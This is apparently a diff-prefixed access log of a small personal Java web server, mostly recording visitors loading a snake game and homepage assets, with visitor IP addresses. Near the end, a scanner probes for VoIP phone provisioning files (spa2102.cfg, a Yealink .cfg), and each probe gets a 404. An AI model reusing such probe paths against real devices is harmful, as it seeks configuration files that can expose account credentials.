+[2019-12-05 19:45:20] [80.62.116.240 / Conn #20] [HTTP-REQUEST] {"GET": "/pages/snake/queue.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "*/*", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #19] [HTTP-RESPONSE] [BODY] File{"name": "/darktheme.css", "length": 1929}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #21] [HTTP-REQUEST] {"GET": "/pages/snake/game.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "*/*", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #20] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:20 CET 2019", "Content-type": "text/js", "Content-length": "696", "Connection": "close"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #23] [HTTP-REQUEST] {"GET": "/pages/snake/page.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "*/*", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:20] [SERVER] Cached "/pages/snake/queue.js" (696 bytes).
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #20] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/queue.js", "length": 696}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #23] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:20 CET 2019", "Content-type": "text/js", "Content-length": "284", "Connection": "close"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #22] [HTTP-REQUEST] {"GET": "/pages/snake/linkedlist.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "*/*", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #21] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:20 CET 2019", "Content-type": "text/js", "Content-length": "2264", "Connection": "close"}
+[2019-12-05 19:45:20] [SERVER] Cached "/pages/snake/page.js" (284 bytes).
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #24] [HTTP-REQUEST] {"GET": "/pages/snake/snake.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "*/*", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #22] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:20 CET 2019", "Content-type": "text/js", "Content-length": "1565", "Connection": "close"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #23] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/page.js", "length": 284}
+[2019-12-05 19:45:20] [SERVER] Cached "/pages/snake/game.js" (2264 bytes).
+[2019-12-05 19:45:20] [SERVER] Cached "/pages/snake/linkedlist.js" (1565 bytes).
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #21] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/game.js", "length": 2264}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #22] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/linkedlist.js", "length": 1565}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #24] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:20 CET 2019", "Content-type": "text/js", "Content-length": "4038", "Connection": "close"}
+[2019-12-05 19:45:20] [SERVER] Cached "/pages/snake/snake.js" (4038 bytes).
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #24] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/snake.js", "length": 4038}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #19] Connection terminated
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #21] Connection terminated
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #22] Connection terminated
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #24] Connection terminated
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #20] Connection terminated
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #23] Connection terminated
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #25] [HTTP-REQUEST] {"GET": "/image/Jaibel.png", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Origin": "http://jaibel.ddns.net", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #26] [HTTP-REQUEST] {"GET": "/image/apple.png", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Origin": "http://jaibel.ddns.net", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #25] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:21 CET 2019", "Content-type": "image/png", "Content-length": "101307", "Connection": "close"}
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #26] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:21 CET 2019", "Content-type": "image/png", "Content-length": "3484", "Connection": "close"}
+[2019-12-05 19:45:21] [SERVER] Cached "/image/apple.png" (3484 bytes).
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #26] [HTTP-RESPONSE] [BODY] File{"name": "/image/apple.png", "length": 3484}
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #26] Connection terminated
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #25] [HTTP-RESPONSE] [BODY] File{"name": "/image/Jaibel.png", "length": 101307}
+[2019-12-05 19:45:21] [80.62.116.240 / Conn #25] Connection terminated
+[2019-12-05 19:48:34] [80.62.116.240 / Conn #27] [HTTP-REQUEST] {"GET": "/", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "DNT": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:34] [80.62.116.240 / Conn #27] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:34 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 19:48:34] [80.62.116.240 / Conn #27] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 19:48:34] [80.62.116.240 / Conn #27] Connection terminated
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #30] [HTTP-REQUEST] {"GET": "/image/CyberFish.png", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #28] [HTTP-REQUEST] {"GET": "/scripts/backgroundChanger.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "*/*", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #29] [HTTP-REQUEST] {"GET": "/darktheme.css", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "text/css,*/*;q=0.1", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #28] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:35 CET 2019", "Content-type": "text/js", "Content-length": "1304", "Connection": "close"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #30] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:35 CET 2019", "Content-type": "image/png", "Content-length": "838937", "Connection": "close"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #28] [HTTP-RESPONSE] [BODY] File{"name": "/scripts/backgroundChanger.js", "length": 1304}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #29] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:35 CET 2019", "Content-type": "text/css", "Content-length": "1929", "Connection": "close"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #29] [HTTP-RESPONSE] [BODY] File{"name": "/darktheme.css", "length": 1929}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #31] [HTTP-REQUEST] {"GET": "/image/Jaibel.png", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #31] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:35 CET 2019", "Content-type": "image/png", "Content-length": "101307", "Connection": "close"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #29] Connection terminated
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #28] Connection terminated
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #32] [HTTP-REQUEST] {"GET": "/image/ThingsThatMove.gif", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #32] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:35 CET 2019", "Content-type": "image/gif", "Content-length": "2555480", "Connection": "close"}
+[2019-12-05 19:48:35] [80.62.116.240 / Conn #31] [HTTP-RESPONSE] [BODY] File{"name": "/image/Jaibel.png", "length": 101307}
+[2019-12-05 19:48:36] [80.62.116.240 / Conn #31] Connection terminated
+[2019-12-05 19:48:39] [80.62.116.240 / Conn #30] [HTTP-RESPONSE] [BODY] File{"name": "/image/CyberFish.png", "length": 838937}
+[2019-12-05 19:48:40] [80.62.116.240 / Conn #30] Connection terminated
+[2019-12-05 19:48:44] [80.62.116.240 / Conn #33] [HTTP-REQUEST] {"GET": "/pages/page1.html", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "DNT": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:44] [80.62.116.240 / Conn #33] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:44 CET 2019", "Content-type": "text/html", "Content-length": "103", "Connection": "close"}
+[2019-12-05 19:48:44] [SERVER] Cached "/pages/page1.html" (103 bytes).
+[2019-12-05 19:48:44] [80.62.116.240 / Conn #33] [HTTP-RESPONSE] [BODY] File{"name": "/pages/page1.html", "length": 103}
+[2019-12-05 19:48:44] [80.62.116.240 / Conn #33] Connection terminated
+[2019-12-05 19:48:45] [80.62.116.240 / Conn #34] [HTTP-REQUEST] {"GET": "/pages/page2.html", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "DNT": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:48:45] [80.62.116.240 / Conn #34] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:48:45 CET 2019", "Content-type": "text/html", "Content-length": "127", "Connection": "close"}
+[2019-12-05 19:48:45] [SERVER] Cached "/pages/page2.html" (127 bytes).
+[2019-12-05 19:48:45] [80.62.116.240 / Conn #34] [HTTP-RESPONSE] [BODY] File{"name": "/pages/page2.html", "length": 127}
+[2019-12-05 19:48:45] [80.62.116.240 / Conn #34] Connection terminated
+[2019-12-05 19:48:47] [80.62.116.240 / Conn #32] [HTTP-RESPONSE] [BODY] File{"name": "/image/ThingsThatMove.gif", "length": 2555480}
+[2019-12-05 19:48:47] [80.62.116.240 / Conn #32] Connection terminated
+[2019-12-05 20:22:53] [77.247.109.70 / Conn #35] Connection terminated
+[2019-12-05 21:09:21] [104.219.234.53 / Conn #36] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213", "User-Agent": "Mozilla/5.0 zgrab/0.x", "Accept": "*/*", "Accept-Encoding": "gzip"}
+[2019-12-05 21:09:21] [104.219.234.53 / Conn #36] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:09:21 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 21:09:21] [104.219.234.53 / Conn #36] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 21:09:21] [104.219.234.53 / Conn #36] Connection terminated
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #37] [HTTP-REQUEST] {"GET": "/pages/snake/snake.html", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Referer": "http://jaibel.ddns.net/", "Accept-Language": "da-dk", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #37] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:43 CET 2019", "Content-type": "text/html", "Content-length": "653", "Connection": "close"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #37] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/snake.html", "length": 653}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #37] Connection terminated
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #38] [HTTP-REQUEST] {"GET": "/darktheme.css", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Accept": "text/css,*/*;q=0.1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #39] [HTTP-REQUEST] {"GET": "/pages/snake/queue.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #40] [HTTP-REQUEST] {"GET": "/pages/snake/linkedlist.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #39] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:43 CET 2019", "Content-type": "text/js", "Content-length": "696", "Connection": "close"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #41] [HTTP-REQUEST] {"GET": "/pages/snake/page.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #40] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:43 CET 2019", "Content-type": "text/js", "Content-length": "1565", "Connection": "close"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #42] [HTTP-REQUEST] {"GET": "/pages/snake/game.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #39] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/queue.js", "length": 696}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #43] [HTTP-REQUEST] {"GET": "/pages/snake/snake.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #38] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:43 CET 2019", "Content-type": "text/css", "Content-length": "1929", "Connection": "close"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #43] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:43 CET 2019", "Content-type": "text/js", "Content-length": "4038", "Connection": "close"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #41] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:43 CET 2019", "Content-type": "text/js", "Content-length": "284", "Connection": "close"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #42] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:43 CET 2019", "Content-type": "text/js", "Content-length": "2264", "Connection": "close"}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #41] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/page.js", "length": 284}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #39] Connection terminated
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #40] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/linkedlist.js", "length": 1565}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #43] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/snake.js", "length": 4038}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #38] [HTTP-RESPONSE] [BODY] File{"name": "/darktheme.css", "length": 1929}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #42] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/game.js", "length": 2264}
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #38] Connection terminated
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #40] Connection terminated
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #43] Connection terminated
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #41] Connection terminated
+[2019-12-05 21:13:43] [176.23.117.213 / Conn #42] Connection terminated
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #44] [HTTP-REQUEST] {"GET": "/image/Jaibel.png", "Host": "jaibel.ddns.net", "Origin": "http://jaibel.ddns.net", "Connection": "keep-alive", "Accept": "image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #44] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:44 CET 2019", "Content-type": "image/png", "Content-length": "101307", "Connection": "close"}
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #45] [HTTP-REQUEST] {"GET": "/image/apple.png", "Host": "jaibel.ddns.net", "Origin": "http://jaibel.ddns.net", "Connection": "keep-alive", "Accept": "image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15", "Accept-Language": "da-dk", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate"}
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #45] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:13:44 CET 2019", "Content-type": "image/png", "Content-length": "3484", "Connection": "close"}
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #45] [HTTP-RESPONSE] [BODY] File{"name": "/image/apple.png", "length": 3484}
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #44] [HTTP-RESPONSE] [BODY] File{"name": "/image/Jaibel.png", "length": 101307}
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #45] Connection terminated
+[2019-12-05 21:13:44] [176.23.117.213 / Conn #44] Connection terminated
+[2019-12-05 21:24:22] [77.247.109.70 / Conn #46] [HTTP-REQUEST] {"GET": "/spa2102.cfg", "Host": "176.23.117.213", "Connection": "Keep-Alive"}
+[2019-12-05 21:24:22] [77.247.109.70 / Conn #46] [INFO] /spa2102.cfg doesn't exist, returning 404 page.
+[2019-12-05 21:24:22] [77.247.109.70 / Conn #46] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:24:22 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 21:24:22] [77.247.109.70 / Conn #46] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 21:24:22] [77.247.109.70 / Conn #46] Connection terminated
+[2019-12-05 21:25:27] [77.247.109.70 / Conn #47] [HTTP-REQUEST] {"GET": "/y000000000031.cfg", "User-Agent": "Yealink W52P 25.80.0.10", "Host": "176.23.117.213", "Connection": "Keep-Alive"}
+[2019-12-05 21:25:27] [77.247.109.70 / Conn #47] [INFO] /y000000000031.cfg doesn't exist, returning 404 page.
+[2019-12-05 21:25:27] [77.247.109.70 / Conn #47] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 21:25:27 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 21:25:27] [77.247.109.70 / Conn #47] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 21:25:27] [77.247.109.70 / Conn #47] Connection terminated
+[2019-12-05 22:13:54] [77.247.109.70 / Conn #48] [HTTP-REQUEST] {"GET": "/spa2102.cfg", "Host": "176.23.117.213", "Connection": "Keep-Alive"}
+[2019-12-05 22:13:54] [77.247.109.70 / Conn #48] [INFO] /spa2102.cfg doesn't exist, returning 404 page.
